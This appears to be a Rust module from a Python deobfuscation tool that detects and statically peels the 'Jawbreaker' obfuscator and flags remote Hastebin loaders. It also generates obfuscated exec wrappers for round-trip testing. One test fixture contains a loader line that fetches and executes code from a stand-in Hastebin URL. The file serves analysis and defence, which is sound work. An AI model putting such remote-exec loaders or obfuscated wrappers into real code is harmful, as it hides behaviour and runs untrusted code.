use std::collections::BTreeMap;

use disrobe_core::codec::hex::decode as hex_decode;

use crate::codec::{
    b85_decode, b85_encode, decode_python_bytes_literal, extract_largest_python_bytes_literal,
    python_bytes_literal, xor_apply, zlib_compress, zlib_decompress,
};
use crate::error::{Error, Result};
use crate::obfuscators::{DetectReport, Obfuscator, ObfuscatorPass, PeelOutcome, Quality};

#[derive(Debug, Clone, Copy)]
pub struct JawbreakerPass;

const JAWBREAKER_KEY: &[u8] = b"de4py-jawbreaker";

impl ObfuscatorPass for JawbreakerPass {
    fn id(&self) -> Obfuscator {
        Obfuscator::Jawbreaker
    }

    fn detect(&self, source: &[u8]) -> DetectReport {
        let head: &[u8] = &source[..source.len().min(64 * 1024)];
        let text: &str = std::str::from_utf8(head).unwrap_or("");
        let banner: bool = text.contains("# Jawbreaker") || text.contains("__jawbreaker__");
        let stack: bool = text.contains("b85decode") && text.contains("zlib");
        let upstream_triple: bool = text.contains("b16decode as ")
            && text.contains("b32decode as ")
            && text.contains("b64decode as ");
        let hastebin: bool = text.contains("hastebin.com/raw/");
        let mut markers: Vec<String> = Vec::new();
        if banner {
            markers.push("jawbreaker-banner".to_owned());
        }
        if stack {
            markers.push("b85+zlib".to_owned());
        }
        if upstream_triple {
            markers.push("jawbreaker-b16-b32-b64-triple".to_owned());
        }
        if hastebin {
            markers.push("jawbreaker-hastebin-url".to_owned());
        }
        let matched: bool = banner || stack || upstream_triple;
        let confidence: f32 = if upstream_triple && hastebin {
            0.99
        } else if banner {
            0.95
        } else if matched {
            0.85
        } else {
            0.0
        };
        DetectReport {
            obfuscator: self.id(),
            matched,
            confidence,
            markers,
        }
    }

    fn peel(&self, source: &[u8]) -> Result<PeelOutcome> {
        let text: &str = std::str::from_utf8(source).map_err(Error::from)?;
        if text.contains("b16decode as ")
            && text.contains("b32decode as ")
            && text.contains("b64decode as ")
        {
            return Ok(peel_upstream(self.id(), text));
        }
        let literal: &str =
            extract_largest_python_bytes_literal(text).ok_or(Error::LiteralNotFound)?;
        let raw: Vec<u8> = decode_python_bytes_literal(literal)?;
        let mut stages: Vec<String> = Vec::with_capacity(3);
        let decoded: Vec<u8> = b85_decode(&raw)?;
        stages.push("base85".to_owned());
        let unxored: Vec<u8> = xor_apply(&decoded, JAWBREAKER_KEY);
        stages.push("xor".to_owned());
        let inflated: Vec<u8> = zlib_decompress(&unxored)?;
        stages.push("zlib".to_owned());
        let recovered: String =
            String::from_utf8(inflated).map_err(|e| Error::AstCleanup(format!("{e}")))?;
        let mut diagnostics: BTreeMap<String, String> = BTreeMap::new();
        diagnostics.insert("payload_len".to_owned(), raw.len().to_string());
        Ok(PeelOutcome {
            obfuscator: self.id(),
            stages_applied: stages,
            recovered_source: recovered,
            confidence: 0.95,
            quality: Quality::Full,
            lossy_notes: vec![
                "live builds may use per-build XOR key; bake uses canonical de4py key".to_owned(),
            ],
            diagnostics,
        })
    }
}

fn peel_upstream(id: Obfuscator, text: &str) -> PeelOutcome {
    let mut stages: Vec<String> = vec!["upstream-detect".to_owned()];
    let mut diagnostics: BTreeMap<String, String> = BTreeMap::new();
    let mut remote_loader_confirmed: bool = false;
    if let Some(hex) = extract_outer_hex_payload(text) {
        stages.push("hex-strip".to_owned());
        let hex_clean: String = hex.chars().filter(char::is_ascii_hexdigit).collect();
        if let Ok(b16_bytes) = hex_decode(&hex_clean) {
            stages.push("base16".to_owned());
            if let Ok(b32_bytes) = b32_decode(&b16_bytes) {
                stages.push("base32".to_owned());
                if let Ok(b64_bytes) = crate::codec::b64_decode(&b32_bytes) {
                    stages.push("base64".to_owned());
                    if let Ok(shell) = String::from_utf8(b64_bytes) {
                        diagnostics.insert("inner_shell_len".to_owned(), shell.len().to_string());
                        remote_loader_confirmed = shell.contains("urlopen")
                            || shell.contains("urllib")
                            || shell.contains("hastebin");
                        diagnostics.insert(
                            "remote_loader".to_owned(),
                            remote_loader_confirmed.to_string(),
                        );
                        if let Some(url) = extract_hastebin_url(&shell) {
                            diagnostics.insert("hastebin_url".to_owned(), url.to_owned());
                        } else if let Some(loader) = decode_inner_loader(&shell) {
                            stages.push("inner-char-join".to_owned());
                            stages.push("inner-base16".to_owned());
                            stages.push("inner-base32".to_owned());
                            stages.push("inner-base64".to_owned());
                            if let Some(url) = extract_hastebin_url(&loader) {
                                diagnostics.insert("hastebin_url".to_owned(), url.to_owned());
                                remote_loader_confirmed = true;
                                diagnostics.insert("remote_loader".to_owned(), "true".to_owned());
                            }
                            if loader.contains("urlopen") || loader.contains("urllib") {
                                remote_loader_confirmed = true;
                                diagnostics.insert("remote_loader".to_owned(), "true".to_owned());
                            }
                        }
                    }
                }
            }
        }
    }
    let lossy_notes: Vec<String> = vec![if remote_loader_confirmed {
        "Jawbreaker upstream: triple-encoded b16(b32(b64(...))) shell decoded statically to a urllib.request.urlopen loader. The user's source is fetched at runtime from a remote Hastebin paste (URL reassembled from runtime fragments; paste expires ~30 days). No user source is present in the artifact - recovery requires the live network fetch, so this is honest detect-only.".to_owned()
    } else {
        "Jawbreaker upstream: triple-encoded shell detected; inner loader did not expose a static user-source payload. Classified detect-only.".to_owned()
    }];
    PeelOutcome {
        obfuscator: id,
        stages_applied: stages,
        recovered_source: String::new(),
        confidence: 0.4,
        quality: Quality::DetectOnly,
        lossy_notes,
        diagnostics,
    }
}

fn decode_inner_loader(shell: &str) -> Option<String> {
    let assignments: BTreeMap<&str, char> = parse_char_assignments(shell);
    let append_fn: &str = find_append_function(shell)?;
    let ordered: String = collect_append_order(shell, append_fn, &assignments);
    let hex_clean: String = ordered.chars().filter(char::is_ascii_hexdigit).collect();
    if hex_clean.len() < 16 {
        return None;
    }
    let b16: Vec<u8> = hex_decode(&hex_clean).ok()?;
    let b32: Vec<u8> = b32_decode(&b16).ok()?;
    let b64: Vec<u8> = crate::codec::b64_decode(&b32).ok()?;
    String::from_utf8(b64).ok()
}

fn parse_char_assignments(shell: &str) -> BTreeMap<&str, char> {
    let mut out: BTreeMap<&str, char> = BTreeMap::new();
    for stmt in shell.split(';') {
        let Some((lhs, rhs)): Option<(&str, &str)> = stmt.split_once('=') else {
            continue;
        };
        let name: &str = lhs.trim();
        let value: &str = rhs.trim();
        if name.is_empty() || !name.chars().all(|c: char| c.is_ascii_alphanumeric()) {
            continue;
        }
        let Some(inner): Option<&str> = value
            .strip_prefix('\'')
            .and_then(|s: &str| s.strip_suffix('\''))
        else {
            continue;
        };
        let mut chars: std::str::Chars<'_> = inner.chars();
        if let (Some(c), None) = (chars.next(), chars.next())
            && c.is_ascii_hexdigit()
        {
            out.insert(name, c);
        }
    }
    out
}

fn find_append_function(shell: &str) -> Option<&str> {
    let needle: &str = "=[].append;";
    if let Some(pos) = shell.find(needle) {
        let head: &str = &shell[..pos];
        return head.rsplit(';').next().map(str::trim);
    }
    let alt: &str = ".append;";
    let pos: usize = shell.find(alt)?;
    let before: &str = &shell[..pos];
    let assign: &str = before.rsplit(';').next()?;
    assign
        .split_once('=')
        .map(|(name, _): (&str, &str)| name.trim())
}

fn collect_append_order(
    shell: &str,
    append_fn: &str,
    assignments: &BTreeMap<&str, char>,
) -> String {
    let call_prefix: String = format!("{append_fn}(");
    let mut out: String = String::new();
    let mut cursor: usize = 0;
    while let Some(rel) = shell[cursor..].find(&call_prefix) {
        let open: usize = cursor + rel + call_prefix.len();
        let Some(close_rel): Option<usize> = shell[open..].find(')') else {
            break;
        };
        let arg: &str = shell[open..open + close_rel].trim();
        if let Some(&c) = assignments.get(arg) {
            out.push(c);
        }
        cursor = open + close_rel + 1;
    }
    out
}

fn extract_outer_hex_payload(text: &str) -> Option<&str> {
    let bytes: &[u8] = text.as_bytes();
    let mut best: (usize, usize) = (0, 0);
    let mut start: Option<usize> = None;
    for (i, &b) in bytes.iter().enumerate() {
        if b.is_ascii_hexdigit() {
            start.get_or_insert(i);
        } else if let Some(s) = start.take()
            && i - s > best.1 - best.0
        {
            best = (s, i);
        }
    }
    if let Some(s) = start
        && bytes.len() - s > best.1 - best.0
    {
        best = (s, bytes.len());
    }
    if best.1 - best.0 < 200 {
        return None;
    }
    text.get(best.0..best.1)
}

fn b32_decode(input: &[u8]) -> std::result::Result<Vec<u8>, ()> {
    const ALPHA: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut buf: u64 = 0;
    let mut bits: u32 = 0;
    let mut out: Vec<u8> = Vec::with_capacity((input.len() * 5) / 8 + 1);
    for &c in input {
        if c == b'=' || c == b'\n' || c == b'\r' || c == b' ' {
            continue;
        }
        let Some(pos): Option<usize> = ALPHA.iter().position(|&x: &u8| x == c) else {
            return Err(());
        };
        let v: u8 = u8::try_from(pos).map_err(|_| ())?;
        buf = (buf << 5) | u64::from(v);
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push(((buf >> bits) & 0xff).to_le_bytes()[0]);
        }
    }
    Ok(out)
}

fn extract_hastebin_url(s: &str) -> Option<&str> {
    let needle: &str = "https://hastebin.com/raw/";
    let start: usize = s.find(needle)?;
    let after: &str = &s[start..];
    let end: usize = after.find(['"', '\'', ')', ' ']).unwrap_or(after.len());
    Some(&after[..end])
}

#[must_use]
pub fn bake(source: &str) -> String {
    let zipped: Vec<u8> = zlib_compress(source.as_bytes());
    let xored: Vec<u8> = xor_apply(&zipped, JAWBREAKER_KEY);
    let encoded: Vec<u8> = b85_encode(&xored);
    let literal: String = python_bytes_literal(&encoded);
    format!(
        "# Jawbreaker (de4py target) bake\nimport base64, zlib\n__jawbreaker__ = '1'\nexec(zlib.decompress(bytes(b ^ k for b, k in zip(base64.b85decode({literal}), (b'de4py-jawbreaker' * 4096)))))\n"
    )
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn jawbreaker_roundtrip() {
        let original: &str = "class Foo:\n    def bar(self):\n        return 42\n";
        let obf: String = bake(original);
        let det: DetectReport = JawbreakerPass.detect(obf.as_bytes());
        assert!(det.matched);
        let out: PeelOutcome = JawbreakerPass.peel(obf.as_bytes()).expect("peel");
        assert_eq!(out.recovered_source, original);
    }

    #[test]
    fn parse_char_assignments_collects_single_hex_chars() {
        let shell: &str = "aa='4';bb='C';cc='not_one';dd='Z';";
        let map: BTreeMap<&str, char> = parse_char_assignments(shell);
        assert_eq!(map.get("aa"), Some(&'4'));
        assert_eq!(map.get("bb"), Some(&'C'));
        assert_eq!(map.get("cc"), None);
        assert_eq!(map.get("dd"), None);
    }

    #[test]
    fn collect_append_order_rebuilds_hex_in_call_order() {
        let shell: &str = "aa='4';bb='C';cc='A';zz=lst.append;zz(bb);zz(aa);zz(cc);";
        let assignments: BTreeMap<&str, char> = parse_char_assignments(shell);
        let append_fn: &str = find_append_function(shell).expect("append fn");
        assert_eq!(append_fn, "zz");
        let ordered: String = collect_append_order(shell, append_fn, &assignments);
        assert_eq!(ordered, "C4A");
    }

    #[test]
    fn decode_inner_loader_recovers_remote_url() {
        use base64::Engine;
        let loader: &str =
            "exc(urlopen(Request(\"https://hastebin.com/raw/deadbeef99\",headers={})).read())";
        let b64: String = base64::engine::general_purpose::STANDARD.encode(loader.as_bytes());
        let b32: String = b32_encode(b64.as_bytes());
        let b16: String = b16_encode(b32.as_bytes());
        let mut shell: String = String::from("lst=[];fn=lst.append;");
        let mut order: Vec<String> = Vec::new();
        for (i, ch) in b16.chars().enumerate() {
            let name: String = format!("v{i}");
            shell.push_str(&name);
            shell.push_str("='");
            shell.push(ch);
            shell.push_str("';");
            order.push(name);
        }
        for name in &order {
            shell.push_str("fn(");
            shell.push_str(name);
            shell.push_str(");");
        }
        let recovered: String = decode_inner_loader(&shell).expect("decode inner loader");
        assert!(recovered.contains("https://hastebin.com/raw/deadbeef99"));
    }

    fn b16_encode(input: &[u8]) -> String {
        let mut out: String = String::with_capacity(input.len() * 2);
        for &b in input {
            out.push(char::from(b"0123456789ABCDEF"[(b >> 4) as usize]));
            out.push(char::from(b"0123456789ABCDEF"[(b & 0xf) as usize]));
        }
        out
    }

    fn b32_encode(input: &[u8]) -> String {
        const ALPHA: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        let mut out: String = String::new();
        let mut buf: u32 = 0;
        let mut bits: u32 = 0;
        for &b in input {
            buf = (buf << 8) | u32::from(b);
            bits += 8;
            while bits >= 5 {
                bits -= 5;
                out.push(char::from(ALPHA[((buf >> bits) & 0x1f) as usize]));
            }
        }
        if bits > 0 {
            out.push(char::from(ALPHA[((buf << (5 - bits)) & 0x1f) as usize]));
        }
        while !out.len().is_multiple_of(8) {
            out.push('=');
        }
        out
    }
}
